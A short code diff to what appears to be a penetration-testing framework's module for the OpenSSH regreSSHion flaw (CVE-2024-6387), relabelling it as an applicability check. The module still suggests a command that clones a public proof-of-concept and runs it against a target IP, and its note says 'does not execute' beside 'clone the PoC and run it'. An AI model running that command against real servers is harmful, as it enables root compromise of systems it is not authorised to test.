@@ -134,11 +134,12 @@ class RegreSSHion(AttackModule):
             note=(
                 "CVE-2024-6387: OpenSSH signal handler race condition leading to "
                 "RCE. Affects < 4.4p1 and 8.5p1 <= v < 9.8p1 (9.8p1 is patched). "
-                "sshd child runs as root -> RCE = root. Clone the Qualys PoC via "
-                "git_clone and run it; the real exploit is a heap-overflow race "
-                "in sshd's SIGALRM handler."
+                "sshd child runs as root so a working exploit yields root — this "
+                "recipe only checks applicability, it does not execute. Clone the "
+                "Qualys PoC via git_clone and run it; the real exploit is a "
+                "heap-overflow race in sshd's SIGALRM handler."
             ),
-            evidence=[f"regreSSHion (CVE-2024-6387) applicable to {ctx.target_ip}"],
+            evidence=[f"regreSSHion (CVE-2024-6387) check queued against {ctx.target_ip} (not executed)"],
             references=[
                 "https://www.qualys.com/2024/07/01/cve-2024-6387/regresshion.txt",
                 "https://nvd.nist.gov/vuln/detail/CVE-2024-6387",
@@ -147,8 +148,7 @@ class RegreSSHion(AttackModule):
             suggested_command=(
                 f"git_clone(url='https://github.com/qualys/regresshion') && python3 regresshion.py {ctx.target_ip} 22"
             ),
-            shell_type="reverse",
-            privilege_level="root",
+            confidence=0.4,
         )
 
 
